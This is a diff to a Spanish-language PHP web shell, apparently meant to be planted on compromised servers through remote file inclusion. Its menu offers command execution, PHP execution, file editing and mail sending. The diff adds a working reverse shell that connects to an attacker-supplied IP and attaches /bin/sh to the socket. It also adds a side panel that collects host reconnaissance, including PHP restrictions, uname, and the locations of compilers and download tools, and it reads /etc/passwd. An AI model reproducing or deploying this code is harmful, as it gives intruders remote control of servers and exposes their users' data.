@@ -45,6 +45,8 @@
     [!] Si en w=editar se envia el formulario con enter, se vuelve a mostrar el mismo texto pero no se guarda nada. Antes era como apretar guardar
     [+] Al subir archivos, ahora intenta usar move_uploaded_file(), leerarchivo() y escribirarchivo()
     [+] leerarchivo() ahora llama a cat "$archivo"
+    [+] Muestra un div lateral con información importante
+    [+] Agregada shell de conexion inversa
     
    ToDo:
    [!] Eliminar los mensajes de: "No se puede leer /var/log/messages porque supera los 50000 bytes", o ponerlos como link
@@ -67,7 +69,6 @@
    [+] Usar ajax
    [+] Agregar comandos de la WSO, r57 y las variaciones de c99
    [+] Poner el css como las imagenes, en una peticion aparte y poner una version oscura
-   [+] Agregar datos importantes en el index (y todas partes) como las shells clasicas, pero oculto hasta que se lleve el mouse para arriba
    [+] Agregar un reverse dns como el de US dentro de la shell
 */
 
@@ -147,7 +148,7 @@ if (isset($nombre_usuario) and ($nombre_usuario != "")){ //si tiene clave
                     }
                     else var expires = "";
                     document.cookie = name+"="+value+expires+"; path=/";
-                }
+                }                    
                 function saveIt() {
                     var x = document.forms["f"].u.value;
                     createCookie("u",x,7);
@@ -195,6 +196,10 @@ if ($_GET["w"]=="img"){
         die(base64_decode('R0lGODlhEAAQANUnAP/3xffkl+vPMfbgjf3zxP7ztvnpofz36PPbg/vuw+3Oaf/78/HVdvbjqvjqtfz0z/bmsPnqvYvAQI/ERJfLS//204nAP5XJSHqzM5bKSoS8O5LHR362N4C4OJDFReu8Ruu2PeuyN+vGUXKsLeuuMvzurP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAACcALAAAAAAQABAAAAaFwNPJRDQJj8ijaTQyJpFFyqX4FC4zm4mlWewSRx6JhtNUiESCtKDbwRQB8EIBsB4umwDRZw8ChUhGXiIHhAkJDgSAQyILjQclJQYBAQMJiiYiFXKQkgMICA6XIg+QkZQIDAwQlx8EnKcMCgoNrAQPDwQJEQ4QDQ0RrH3CIcTFl17IVFXLQQA7'));  
     }elseif($_GET["imagen"]=="php"){
         die(base64_decode('R0lGODlhEAAQAMQfAOTq8+3x9pSty/L2+26NyLXa/JTI+lZtjYSiuFJrsUlVa8jj/oW05uft9XqVr9TZ6d3h76zU+93n8FJgebLD00NLXGqIqSkxQz5FVb/e/XuZ0MvM0Z/P+0BXo////////yH5BAEAAB8ALAAAAAAQABAAAAWloCeO5PidnoMggrA6sGN5qCA1AZ43DWAcNI8gsCgWM8gBgwH0UAbGBTJTGFibgYAm0ekmCIJCdSKSdDuBcyehiQzIns6gARkEBHMIe6AQdQAdEA1ogxAdBAB9cQEAD4CMEA9sABUiAoBqD2sEHBKVHg0ECVxeBAwGBhIYIhQeVAURERyzqAGrHhYPdjwAvQASARsXIg4HxhMTCgoVFRgYF3Al0iQhADs='));  
+    }elseif($_GET["imagen"]=="derecha"){
+        die(base64_decode('R0lGODlhEAAQAMQfAJLNW3aXtMfj/pfL/OTr9IivyMvM0Vdwkb7e/UpXbfP2+azU+9Xo9Ovx9u32/mGNRIm77OPx/rXZ/H6xW1Jhe6/S5ERNX5rA1qjL3tvj6ykxQz9GVqDP+2OPRf///////yH5BAEAAB8ALAAAAAAQABAAAAWYoCeO5PidHlNV2HUVRSAHHloxRKM3RE9Ah5qn0hAYjYikAwIUYRRHAaKjdCgoogv0OO1IvtfstkPuALyLsKcAnQLegEknnRCxk4/J5D15CAh1HgENSWVmDxEcBBYig0kMEREdiBwDi42EXwsLHYkDAxkbjQoImgsclZ8Noh4HGQo8Pj0ZDQYajQe5FBQJCRYWGxsaWCXFJSEAOw=='));  
+    }elseif($_GET["imagen"]=="izquierda"){
+        die(base64_decode('R0lGODlhEAAQAMQfAHaXtJLNW5fL/OTs9YivyMfj/tXb5Fdwkb3e/anT+0lVa/P2+dTn9Ovx9u32/mGNRIm77LXZ/H6xW1Jhe+Px/rTR4ENLXJrA1qjL3uDo7ykxQz5FVZ/P+2OPRf///////yH5BAEAAB8ALAAAAAAQABAAAAWaoCeO5PidHlNV2HURBCADHloxQ6M3Qz9Ah5qn0igYjYikAwIUYRbHQieJcDgWE9EFauxMEZEwVsvtBLxeRmLsIUAfkoD8TFkrRG4EXC6RdOoDdx4ADUkPAQ9oFBwDFiKESRGJFBQFHBwZjoOFYQkdlhwCAhkbjwtgEQmql6INpR4HBgs8Phm2DRUajwe8ExMKChbCGxpZJcclIQA7'));      
     }else{
         die();
     }
@@ -227,19 +232,19 @@ echo'
             padding-left:10px;
             border: 1px dashed #BDB5AF;
         }
-        #contenedorgrande{
-            background-color: #EBECE4;
-            font-size: 12px;
-            color: #8B8378;
-            margin:2% auto 2% auto;
-            width:80%;
-            border: 1px dashed #DDD5CF;
-        }
-        #contenedor{
+        .contenedor{
             border: 2px solid #333333;
             padding: 1% 2% 2% 1%;
             margin: 0 auto 0 auto;
             border-color: #CDC5BF
+        }
+        .contenedorgrande{
+            background-color: #EBECE4;
+            font-size: 12px;
+            color: #8B8378;
+            margin:2% auto 2% 2%;
+            width:80%;
+            border: 1px dashed #DDD5CF;
         }
         .n{
             font-weight: bold;
@@ -286,6 +291,14 @@ echo'
         textarea:focus, textarea:hover, input:hover, input:focus {
             border: 2px solid #EE7621;
         }
+        .headoculto{
+            /*display:none;*/
+            position: fixed;
+            top:0;
+            width: 17%;
+            padding: 0 0 0 0;
+            right: 0;
+        }
         /* Estilo para el phpinfo */
         #phpinfo {width: 100%;}
         #phpinfo body, #phpinfo td, #phpinfo th, #phpinfo h1, #phpinfo h2 {font-family: sans-serif;}
@@ -308,9 +321,35 @@ echo'
         #phpinfo hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;}
     </style>    
 </head>
-<body>
-    <div id="contenedorgrande">
-    <div id="contenedor">
+<body'.(($_COOKIE["lateral"]=="OFF")?" onload=ocultar() ":"").'>
+    <div class="headoculto contenedorgrande contenedor" id="headoculto">
+        <div style="float:left;width:10%;height:100%; position:relative; top:50%;">
+            <br><br><br><br>
+            <script>
+            function ocultar(){
+                document.getElementById("flechaizquierda").style.display="";
+                document.getElementById("flechaderecha").style.display="none";
+                document.getElementById("headoculto").style.right="-16%";
+                document.getElementById("contenedorgrande").style.margin="2% auto 2% auto";
+                document.cookie = "lateral=OFF; path=/";
+            }
+            function mostrar(){
+                document.getElementById("flechaizquierda").style.display="none";
+                document.getElementById("flechaderecha").style.display="";
+                document.getElementById("headoculto").style.right="0";
+                document.getElementById("contenedorgrande").style.margin="2% auto 2% 2%";
+                document.cookie = "lateral=ON; path=/";
+            }
+            </script>
+            <img src="?w=img&imagen=derecha" alt=">&gt; &gt;" id="flechaderecha" onclick="ocultar();">
+            <img src="?w=img&imagen=izquierda" style="display:none;" id="flechaizquierda" alt="&lt; &lt;" onclick="mostrar();">
+        </div>
+        
+        <div style="float:right; width: 90%; margin: auto 0 auto 0; overflow:auto;">'.mostrarinformacion().'
+        </div>
+    </div>
+    <div class="contenedorgrande" id="contenedorgrande">
+    <div class="contenedor">
 ';
 
 
@@ -1161,6 +1200,40 @@ psybnc.conf
         echo '<meta http-equiv="refresh" content="0; URL=http://'.htmlentities($_GET["url"],ENT_QUOTES,'UTF-8').'">';
     break;
     
+    /* Conexion inversa / escuchar */
+    case "socketshell":
+        /* Mostramos el titulo */
+        echo '<div style="text-align:center;">
+        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
+        </div>';
+        
+        echo '
+        <table>
+            <form action="'.$rfiurl.'w=socketshell" method="post">
+               <tr><td>Conexi&oacute;n inversa: <br>IP <input type="text" name="ip" value="'.($_POST["ip"]?$_POST["ip"]:$_SERVER["REMOTE_ADDR"]).'"> <br>Puerto <input type="text" name="puertoinversa" value="'.($_POST["puertoinversa"]?$_POST["puertoinversa"]:"80").'"> <br><input type="submit" name="accion" value="Conectar"></td>
+               <td style="width:3px; padding:0px;"></td>
+               <td>Escuchar: <br>Puerto <input type="text" disabled="disabled" name="puertoescuchar" value="'.($_POST["puertoescuchar"]?$_POST["puertoescuchar"]:"8080").'"> <br><input type="submit" disabled="disabled" name="accion" value="Escuchar"></tr>
+            </form>
+        </table>
+        <br>
+        ';
+        if($_POST["accion"]=="Conectar"){
+            if(is_resource($socket = pfsockopen($_POST["ip"],$_POST["puertoinversa"]))){
+                $descriptorspec = array($socket,$socket,$socket);
+                $shellproc = proc_open("/bin/sh",$descriptorspec,$pipes);
+                fputs($socket,"WARNING:  The use of this U.S. Government system is restricted to authorized users only.  Unauthorized access, use, or modification of this computer system or of the data contained herein or in transit to/from this system constitutes a violation of Title 18, United States Code, Section 1030 and state criminal and civil laws.  These systems and equipment are subject to monitoring to ensure proper performance of applicable security features or procedures.  Such monitoring may result in the acquisition, recording and analysis of all data being communicated, transmitted, processed or stored in this system by a user.  If monitoring reveals possible evidence of criminal activity, such evidence may be provided to law enforcement personnel. \n\n      ANYONE USING THIS SYSTEM EXPRESSLY CONSENTS TO SUCH \n");
+                proc_close($shellproc);
+                fclose($socket);
+                echo '<div class="s">Conectado</div>';
+            }else{
+                echo '<div class="n">No se pudo conectar</div>';
+            }
+        }elseif($_POST["accion"]=="Escuchar"){
+            //aca va un codigo que por ahora no anda :P
+        }
+
+    break; 
+    
     /* Menu principal */
     default:
         echo '<div style="text-align:center;">
@@ -1170,6 +1243,7 @@ psybnc.conf
         <a href="'.$rfiurl.'w=info">Mas informaci&oacute;n</a><br>
         <a href="'.$rfiurl.'w=shell">Ejecutar comandos</a><br>
         <a href="'.$rfiurl.'w=php">Ejecutar PHP</a><br>
+        <a href="'.$rfiurl.'w=socketshell">Conexi&oacute;n inversa / escuchar</a><br>
         <a href="'.$rfiurl.'w=archivos">Navegador de archivos</a><br>
         <a href="'.$rfiurl.'w=editar">Editor de archivos</a><br>
         <a href="'.$rfiurl.'w=mail">Enviar E-mails</a><br>
@@ -1484,5 +1558,34 @@ function archivosdeusuarios($ruta){
             }
         }
     return $salida;
+}
+
+//genera la información que sale en el div del costado
+function mostrarinformacion(){
+    $ruta = getcwd() or '/';
+    
+    if((!ini_get("safe_mode")) or (strtolower(ini_get("safe_mode"))=="off")){
+        $safemode = "No";
+    }else{
+        $safemode = "Si";
+    } 
+    
+    return '<b>'.htmlentities(__FILE__, ENT_QUOTES, 'UTF-8').'</b><br><br>
+    <b>'.htmlentities(decodeSize(disk_free_space($ruta)), ENT_QUOTES, 'UTF-8').'</b> / <b>'.htmlentities(decodeSize(disk_total_space($ruta)), ENT_QUOTES, 'UTF-8').'</b><br><br>
+    <b>PHP:</b> '.htmlentities(phpversion(), ENT_QUOTES, 'UTF-8').'<br><br>
+    <b>Zend:</b> '.htmlentities(zend_version(), ENT_QUOTES, 'UTF-8').'<br><br>
+    <b>Safe_mode:</b> '.$safemode.'<br><br>
+    <b>Funciones desactivadas:</b> '.htmlentities(ini_get("disable_functions"), ENT_QUOTES, 'UTF-8').'<br><br>
+    <b>Open basedir:</b> '.htmlentities(ini_get("open_basedir"), ENT_QUOTES, 'UTF-8').'<br><br>
+    <b>'.htmlentities(php_uname(), ENT_QUOTES, 'UTF-8').'</b><br><br>
+    '.shell("whereis gcc",false).'<br><br>
+    '.shell("whereis perl",false).'<br><br>
+    '.shell("whereis python",false).'<br><br>
+    '.shell("whereis curl",false).'<br><br>
+    '.shell("whereis wget",false).'<br><br>
+    <br>
+    ';
+    $usuarios = explode("\n",leerarchivo("/etc/passwd"));
+
 }
 ?>
